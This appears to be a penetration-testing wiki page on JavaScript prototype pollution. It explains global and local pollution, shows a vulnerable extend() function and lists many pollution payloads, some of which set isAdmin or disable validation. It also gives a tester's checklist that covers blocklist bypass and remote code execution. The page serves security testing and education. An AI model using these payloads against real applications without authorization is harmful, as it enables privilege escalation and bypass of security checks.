# Prototype Pollution

## What is it?

Prototype Pollution is a vulnerability that occurs when an attacker manipulates the prototype of a JavaScript object. It exploits the dynamic nature of JavaScript, allowing an attacker to modify an object's structure and behavior.

This vulnerability is unique to JavaScript environments due to the language's flexible object model, where prototypes are shared between all objects of the same type. Consequently, a change to the prototype is reflected across all instances, potentially affecting the application's behavior globally.

There are mainly two types of Prototype Pollution:

1. **Global Prototype Pollution**: This involves manipulating JavaScript's built-in object prototypes, such as `Object.prototype`, `Array.prototype`, etc. It can lead to various forms of attacks, such as adding, modifying, or deleting properties and methods, affecting the entire application.
2. **Local Prototype Pollution**: This is more specific and involves manipulating the prototype of specific objects in the application. The impact is usually confined to the scope of those specific objects.

It's important to note that due to its nature, Prototype Pollution can lead to other kinds of attacks like:

* Privilege escalation: By altering properties that control user privileges.
* Remote Code Execution: By changing methods or properties related to function execution.
* Denial of Service: By overloading methods or properties causing resource exhaustion.
* Bypassing security measures: By altering validation or security checks.

For more details on Prototype Pollution see the relevant resources and child pages.

### Payloads

```shellscript
# Simple `__proto__` Assignment (Key-Value)
{"__proto__": {"test": true}}

# Simple `constructor.prototype` Assignment (Key-Value)
{"constructor": {"prototype": {"test": true}}}

# Direct Property Assignment (Bracket Notation)
{"__proto__[test]": true}

# Direct Prototype Assignment (Dot Notation)
{"__proto__.test": true}

# Using `constructor.prototype` (Dot Notation)
{"constructor.prototype.test": true}

# Overwrite `__proto__` Object
{"__proto__": "test"}

# Empty Object Injection
{"__proto__": {}}

# Nullify Prototype
{"__proto__": null}

# Constructor Manipulation
{"constructor": {"test": true}}

# Prototype Chain Poisoning
{"constructor": {"prototype": {"__proto__": {"test": true}}}}

# Array Pollution
{"__proto__": []}

# Function Prototype Pollution
{"__proto__.constructor.prototype.test": true}

# Recursive Prototype Chain
{"__proto__.constructor.prototype.__proto__.test": true}

# Boolean Prototype
{"__proto__": {"constructor": {"prototype": {"test": true}}}}

# Constructor Pollution via Function
{"constructor": {"prototype": {"constructor": {"prototype": {"test": true}}}}}

# Combination Payloads
{"__proto__.test": true, "constructor.prototype.test": true}

# `__proto__` Bracket Notation Assignment
Object.__proto__["test"] = true

# `__proto__` Dot Notation Assignment
Object.__proto__.test = true

# `constructor.prototype` Dot Notation Assignment
Object.constructor.prototype.test = true

# `constructor.prototype` Bracket Notation Assignment
Object.constructor["prototype"]["test"] = true

# Overwrite `__proto__` Object using JSON
{"__proto__": {"test": true}}

# `__proto__` with Specific Property
{"__proto__.name":"test"}

# Array Style Bracket Notation with `__proto__`
x[__proto__][test] = true

# Dot Notation with `__proto__`
x.__proto__.test = true

# Bracket Notation with `__proto__` (short)
__proto__[test] = true

# Dot Notation with `__proto__` (short)
__proto__.test = true

# Query Parameter Pollution
?__proto__[test]=true

```

```
# https://github.com/msrkp/PPScan
# https://github.com/BlackFan/client-side-prototype-pollution
```

## Client-side prototype pollution

### What is it?

Client-side Prototype Pollution is an attack that occurs when an attacker is able to manipulate the prototype of a JavaScript object. This can lead to unexpected behavior in the application, and sometimes lead to bypassing of security measures and Remote Code Execution.

**A simple example**

Consider this vulnerable JavaScript function:

```javascript
function extend(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
}
```

If an we can control the `source` object and sets `source.__proto__.isAdmin = true`, then this will set `isAdmin = true` on all objects that inherit from `Object`, potentially leading to an escalation of privileges.

Note that payload or attack depends on the application and the structure of the code. Client-side Prototype Pollution can often lead to:

* Privilege escalation
* Security measures bypass
* Data manipulation
* Remote code execution

**Other learning resources:**

*

**Writeups:**

*

### Checklist

* [ ] Understand the JavaScript environment
  * [ ] What libraries or frameworks are being used
  * [ ] How does the application handle user input
  * [ ] How does the application manipulate objects and their prototypes
* [ ] Identify potential points of attack
  * [ ] User-supplied input that is directly used as an object
  * [ ] Functions that iterate over properties of user-supplied objects
  * [ ] Functions that use the Object or Function constructors with user input
* [ ] Test the prototype
  * [ ] Can you add a new property to the prototype?
  * [ ] Can you modify an existing property on the prototype?
  * [ ] Can you delete a property from the prototype?
* [ ] Test for privilege escalation
  * [ ] Add a new user privilege to the prototype
  * [ ] Modify an existing user privilege on the prototype
  * [ ] Delete a user privilege from the prototype
* [ ] Test for security measures bypass
  * [ ] Add a new security property to the prototype
  * [ ] Modify an existing security property on the prototype
  * [ ] Delete a security property from the prototype
* [ ] Is it actually exploitable?
  * [ ] Is there a blocklist?
  * [ ] Can you bypass the blocklist?
  * [ ] Test for insecure direct object references
  * [ ] Test for remote code execution
* [ ] Test for patches
  * [ ] How does the application behave with patched libraries like Lodash, JQuery, etc.?
  * [ ] Is the patch effective or can it be bypassed?

### Exploitation

```javascript
// Add new property
payload = '{"__proto__":{"polluted":"pwned"}}'

// Modify an existing property
payload = '{"__proto__":{"existingProperty":"new value"}}'

// Delete a property
payload = '{"__proto__":{"existingProperty":null}}'

// Adding user privilege
payload = '{"__proto__":{"isAdmin":true}}'

// Bypassing security measures
payload = '{"__proto__":{"validateInput":false}}'
```
